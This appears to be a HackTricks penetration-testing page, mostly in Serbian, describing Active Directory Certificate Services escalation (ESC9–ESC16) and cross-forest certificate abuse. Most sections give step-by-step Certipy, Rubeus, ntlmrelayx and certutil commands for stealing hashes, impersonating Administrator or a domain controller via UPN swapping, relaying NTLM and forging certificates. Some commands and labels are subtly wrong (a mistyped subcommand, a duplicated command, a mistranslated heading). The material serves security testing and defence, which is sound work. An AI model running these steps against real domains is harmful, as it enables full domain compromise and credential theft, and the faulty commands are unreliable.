Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad `Jane@corp.local`, s ciljem da kompromituje `Administrator@corp.local`. `ESC9` šablon sertifikata, za koji je `Jane@corp.local` ovlašćena da se prijavi, konfigurisan je sa `CT_FLAG_NO_SECURITY_EXTENSION` flagom u okviru `msPKI-Enrollment-Flag` podešavanja.

U početku, hash od `Jane` se dobija koristeći Shadow Credentials, zahvaljujući `John`-ovim `GenericWrite` dozvolama:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Naknadno, `Jane`-in `userPrincipalName` je izmenjen u `Administrator`, namerno izostavljajući deo domene `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova izmena ne krši ograničenja, s obzirom da `Administrator@corp.local` ostaje različit kao `Administrator`ov `userPrincipalName`.

Nakon toga, `ESC9` šablon sertifikata, označen kao ranjiv, je zatražen kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Primećeno je da sertifikatov `userPrincipalName` prikazuje `Administrator`, bez bilo kakvog “object SID”.

`Jane`-in `userPrincipalName` se zatim vraća na njen original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentifikacije izdatim sertifikatom sada vraća NT hash korisnika `Administrator@corp.local`. Komanda mora uključivati `-domain <domain>` zbog toga što sertifikat nema specificiran domen:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Slabo mapiranje sertifikata - ESC10

### Objašnjenje

ESC10 se odnosi na dve vrednosti Windows Registry ključa na kontroleru domena:

- Podrazumevana vrednost za `CertificateMappingMethods` pod `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` je `0x18` (`0x8 | 0x10`), ranije postavljena na `0x1F`.
- Podrazumevano podešavanje za `StrongCertificateBindingEnforcement` pod `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` je `1`, ranije `0`.

### Slučaj 1

Kada je `StrongCertificateBindingEnforcement` konfigurisano kao `0`.

### Slučaj 2

Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Zloupotreba - Slučaj 1

Ako je `StrongCertificateBindingEnforcement` podešen na `0`, nalog A sa `GenericWrite` dozvolama može se iskoristiti da kompromituje bilo koji nalog B.

Na primer, ako napadač ima `GenericWrite` dozvole nad `Jane@corp.local`, cilj mu je da kompromituje `Administrator@corp.local`. Postupak je isti kao kod ESC9, što omogućava korišćenje bilo kojeg šablona sertifikata.

U početku se hash `Jane` dobija korišćenjem Shadow Credentials, iskorišćavajući `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `Jane`-in `userPrincipalName` je izmenjen u `Administrator`, namerno izostavljajući deo `@corp.local` da bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga, zatražen je sertifikat koji omogućava autentifikaciju klijenta kao `Jane`, koristeći podrazumevani `User` šablon.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` se zatim vraća na originalnu vrednost, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacijom dobijenog sertifikata dobićete NT hash korisnika `Administrator@corp.local`, pa je potrebno navesti domen u naredbi zbog nedostatka podataka o domenu u sertifikatu.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Slučaj zloupotrebe 2

Kada `CertificateMappingMethods` sadrži `UPN` bit flag (`0x4`), nalog A sa `GenericWrite` dozvolama može kompromitovati bilo koji nalog B koji nema `userPrincipalName` property, uključujući machine accounts i ugrađenog domain administratora `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od dobijanja `Jane`'s hash pomoću Shadow Credentials, iskorišćavanjem `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Vrednost `userPrincipalName` za `Jane` je zatim postavljena na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Sertifikat za autentifikaciju klijenta je zatražen kao `Jane` koristeći podrazumevani šablon `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnice `Jane` se nakon ovog procesa vraća na izvorni.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Za autentifikaciju preko Schannel korišćena je Certipy opcija `-ldap-shell`, što označava uspešnu autentifikaciju kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande poput `set_rbcd` omogućavaju Resource-Based Constrained Delegation (RBCD) napade, potencijalno kompromitujući domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na bilo koji korisnički nalog koji nema `userPrincipalName` ili na kome se on ne poklapa sa `sAMAccountName`; podrazumevani `Administrator@corp.local` je primarni cilj zbog svojih povišenih LDAP privilegija i zato što podrazumevano nema `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Možete koristiti `certipy` da proverite da li je `Enforce Encryption for Requests` onemogućen, a certipy će prikazati `ESC11` ranjivosti.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenarij zloupotrebe

Potrebno je postaviti relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za domain controllers, moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Objašnjenje

Administratori mogu da podese Certificate Authority tako da ga skladišti na eksternom uređaju kao što je "Yubico YubiHSM2".

Ako je USB uređaj povezan sa CA serverom preko USB porta, ili kroz USB device server u slučaju da je CA server virtuelna mašina, authentication key (sometimes referred to as a "password") je potreban Key Storage Provider-u da bi generisao i koristio ključeve u YubiHSM.

Ovaj ključ/password je sačuvan u registru pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` u čistom tekstu.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenarij zloupotrebe

Ako je privatni ključ CA-a uskladišten na fizičkom USB uređaju, kada dobijete shell access, moguće je povratiti ključ.

U prvom koraku, potrebno je dobiti CA certificate (ovo je javno) i zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Na kraju, koristite certutil `-sign` komandu da falsifikujete novi proizvoljni sertifikat koristeći CA sertifikat i njegov privatni ključ.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u šablon sertifikata. Objekti `msPKI-Enterprise-Oid` koji su odgovorni za izdavanje politika mogu se otkriti u Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) PKI OID containera. Politika može biti povezana sa AD grupom korišćenjem `msDS-OIDToGroupLink` atributa ovog objekta, što omogućava sistemu da autorizuje korisnika koji priloži sertifikat kao da je član te grupe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Drugim rečima, kada korisnik ima dozvolu da zatraži izdavanje sertifikata i sertifikat je povezan sa OID grupom, korisnik može naslediti privilegije te grupe.

Koristite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da pronađete OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenarij zloupotrebe

Pronađite korisničko dopuštenje koje možete iskoristiti koristeći `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu za upis (enroll) `VulnerableTemplate`, korisnik može naslediti privilegije grupe `VulnerableGroup`.

Sve što treba da uradi je da navede šablon; dobiće sertifikat sa pravima OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Konfiguracija ranjivog obnavljanja sertifikata - ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. Ispod sledi citat originalnog teksta.

ESC14 se bavi ranjivostima koje proizilaze iz "weak explicit certificate mapping", prvenstveno kroz zloupotrebu ili nesigurnu konfiguraciju atributa `altSecurityIdentities` na Active Directory korisničkim ili računarima naloga. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhu autentifikacije. Kada je popunjen, ovo eksplicitno mapiranje može nadjačati podrazumevanu logiku mapiranja sertifikata, koja obično zavisi od UPN-ova ili DNS imena u SAN sertifikata, ili SID-a ugrađenog u `szOID_NTDS_CA_SECURITY_EXT` security extension.

"Slabo" mapiranje se javlja kada je string vrednost korišćena unutar atributa `altSecurityIdentities` za identifikaciju sertifikata preširoka, lako pogodiva, oslanja se na nejedinstvena polja sertifikata ili koristi lako falsifikovane komponente sertifikata. Ako napadač može da pribavi ili izradi sertifikat čiji atributi odgovaraju tako slabo definisanom eksplicitnom mapiranju za privilegovani nalog, može koristiti taj sertifikat da se autentifikuje i predstavlja kao taj nalog.

Primeri potencijalno slabih `altSecurityIdentities` mapping stringova uključuju:

- Mapiranje isključivo po uobičajenom Subject Common Name (CN): npr., `X509:<S>CN=SomeUser`. Napadač bi mogao da pribavi sertifikat sa ovim CN iz manje sigurnog izvora.
- Korišćenje previše generičkih Issuer Distinguished Names (DNs) ili Subject DNs bez daljeg kvalifikovanja kao što su specifičan serial number ili subject key identifier: npr., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Upotreba drugih predvidljivih obrazaca ili ne-kriptografskih identifikatora koje napadač može zadovoljiti u sertifikatu koji može legitimno dobiti ili falsifikovati (ako je kompromitovao CA ili pronašao ranjiv template kao u ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapira po punom Issuer i Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (mapira po Subject Key Identifier vrednosti u sertifikatu)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapira po serial number-u, implicitno kvalifikovanom Issuer DN-om) - ovo nije standardni format, obično je `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapira po RFC822 imenu, obično email adresi, iz SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapira po SHA1 hashu raw public key-a sertifikata - generalno jako)

Bezbednost ovih mapiranja u velikoj meri zavisi od specifičnosti, jedinstvenosti i kriptografske jačine izabranih identifikatora sertifikata korišćenih u mapping stringu. Čak i sa omogućenim jakim režimima vezivanja sertifikata na Domain Controllers (koji pre svega utiču na implicitna mapiranja zasnovana na SAN UPN-ovima/DNS i SID ekstenziji), loše konfigurisana `altSecurityIdentities` stavka i dalje može predstavljati direktan put za impersonaciju ako je sama logika mapiranja pogrešna ili previše permisivna.

### Scenarij zloupotrebe

ESC14 cilja **eksplicitna mapiranja sertifikata** u Active Directory (AD), konkretno atribut `altSecurityIdentities`. Ako je ovaj atribut postavljen (po dizajnu ili zbog pogrešne konfiguracije), napadači mogu da se predstavljaju kao nalozi tako što će prikazati sertifikate koji odgovaraju mapiranju.

#### Scenarij A: Napadač može da piše u `altSecurityIdentities`

**Preduslov**: Napadač ima write permisije nad `altSecurityIdentities` atributom ciljane naloga ili ima dozvolu da je dodeli u vidu jedne od sledećih permisija na ciljnom AD objektu:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenarij B: Cilj ima slabo mapiranje preko X509RFC822 (email)

- **Preduslov**: Cilj ima slabo X509RFC822 mapiranje u altSecurityIdentities. Napadač može da postavi victim-ov `mail` atribut da se poklapa sa target-ovim X509RFC822 imenom, upiše sertifikat kao victim i iskoristi ga da se autentifikuje kao cilj.

#### Scenarij C: Cilj ima X509IssuerSubject mapiranje

- **Preduslov**: Cilj ima slabo X509IssuerSubject eksplicitno mapiranje u `altSecurityIdentities`. Napadač može da postavi `cn` ili `dNSHostName` atribut na victim principal-u da odgovara subject-u target-ovog X509IssuerSubject mapiranja. Zatim, napadač može upisati sertifikat kao victim i koristiti taj sertifikat da se autentifikuje kao cilj.

#### Scenarij D: Cilj ima X509SubjectOnly mapiranje

- **Preduslov**: Cilj ima slabo X509SubjectOnly eksplicitno mapiranje u `altSecurityIdentities`. Napadač može da postavi `cn` ili `dNSHostName` atribut na victim principal-u da odgovara subject-u target-ovog X509SubjectOnly mapiranja. Zatim, napadač može upisati sertifikat kao victim i koristiti taj sertifikat da se autentifikuje kao cilj.

### konkretne operacije
#### Scenarij A

Zatražite sertifikat iz šablona sertifikata `Machine`.
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sačuvajte i konvertujte sertifikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autentifikujte se (koristeći sertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Čišćenje (opciono)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Za specifičnije metode napada u raznim scenarijima, molimo pogledajte sledeće: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

Opis na https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc je izuzetno detaljan. Ispod sledi citat originalnog teksta.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Zloupotreba

Sledeće se odnosi na [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Certipy's `find` command može pomoći da identifikujete V1 templates koji su potencijalno podložni ESC15 ako CA nije zakrpljen.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenarij A: Direktno lažno predstavljanje preko Schannel

**Korak 1: Zatražite sertifikat, ubacujući "Client Authentication" Application Policy i ciljni UPN.** Napadač `attacker@corp.local` cilja `administrator@corp.local` koristeći "WebServer" V1 šablon (koji omogućava enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Ranjiv V1 template sa "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u Application Policies ekstenziju CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN za impersonaciju.

**Korak 2: Autentifikujte se putem Schannel (LDAPS) koristeći dobijeni sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenarij B: PKINIT/Kerberos Impersonation putem Enrollment Agent Abuse

**Korak 1: Zatražite sertifikat iz V1 template (sa "Enrollee supplies subject"), ubacujući "Certificate Request Agent" Application Policy.** Ovaj sertifikat je za napadača (`attacker@corp.local`) da postane enrollment agent. Ovde nije naveden nijedan UPN za identitet napadača, jer je cilj sposobnost agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Ubacuje OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Iskoristite "agent" sertifikat da zatražite sertifikat u ime ciljanog privilegovanog korisnika.** Ovo je ESC3-like korak, koristeći sertifikat iz Koraka 1 kao agent sertifikat.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći "on-behalf-of" sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi se na scenario gde, ako konfiguracija AD CS ne primorava uključivanje **szOID_NTDS_CA_SECURITY_EXT** ekstenzije u sve sertifikate, napadač to može iskoristiti na sledeći način:

1. Zahtevanje sertifikata **without SID binding**.

2. Korišćenje ovog sertifikata **for authentication as any account**, na primer impersoniranjem naloga visokih privilegija (npr. Domain Administrator).

You can also refer to this article to learn more about the detailed principle:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

Sledeće se odnosi na [ovaj link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Kliknite da biste videli detaljnije metode upotrebe.

To identify whether the Active Directory Certificate Services (AD CS) environment is vulnerable to **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Korak 1: Pročitajte početni UPN naloga žrtve (Opcionalno - za obnavljanje).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Korak 2: Ažurirajte UPN naloga žrtve na `sAMAccountName` ciljanog administratora.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Korak 3: (ako je potrebno) Nabavite podatke za prijavu za nalog "žrtve" (npr. putem Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Korak 4: Zatražite sertifikat kao korisnik "victim" iz _bilo kojeg odgovarajućeg šablona za autentifikaciju klijenta_ (npr. "User") na CA ranjivom na ESC16.** Pošto je CA ranjiv na ESC16, automatski će izostaviti SID security extension iz izdatog sertifikata, bez obzira na specifična podešavanja šablona za ovo proširenje. Postavite promenljivu okruženja Kerberos credential cache (shell komanda):
```bash
export KRB5CCNAME=victim.ccache
```
Zatim zatražite sertifikat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Korak 5: Vratite UPN naloga "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Korak 6: Autentifikujte se kao ciljni administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

Konfiguracija za **cross-forest enrollment** je relativno jednostavna. The **root CA certificate** from the resource forest is **published to the account forests** by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates` and AIA containers in each account forest**. Da pojasnimo, ova postavka daje **CA in the resource forest complete control** over all other forests za koje upravlja PKI. Should this CA be **compromised by attackers**, sertifikati za sve korisnike u oba — resource i account forests — mogli bi biti **forged by them**, čime bi bila narušena sigurnosna granica foresta.

### Enrollment Privileges Granted to Foreign Principals

U multi-forest okruženjima treba postupati oprezno prema Enterprise CAs koje **publish certificate templates** koje dozvoljavaju **Authenticated Users or foreign principals** (korisnici/grupe koji su eksterni u odnosu na forest kojem pripada Enterprise CA) **enrollment and edit rights**.\
Prilikom autentikacije preko trust-a, **Authenticated Users SID** se dodaje u token korisnika od strane AD. Dakle, ako domen poseduje Enterprise CA sa template-om koji **allows Authenticated Users enrollment rights**, taj template bi potencijalno mogao biti **enrolled in by a user from a different forest**. Isto tako, ako su **enrollment rights are explicitly granted to a foreign principal by a template**, time se kreira **cross-forest access-control relationship**, omogućavajući principal-u iz jednog foresta da **enroll in a template from another forest**.

Oba scenarija vode ka povećanju **attack surface** sa jednog foresta na drugi. Podešavanja certificate template-a mogu biti iskorišćena od strane napadača da se dobiju dodatne privilegije u stranom domenu.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
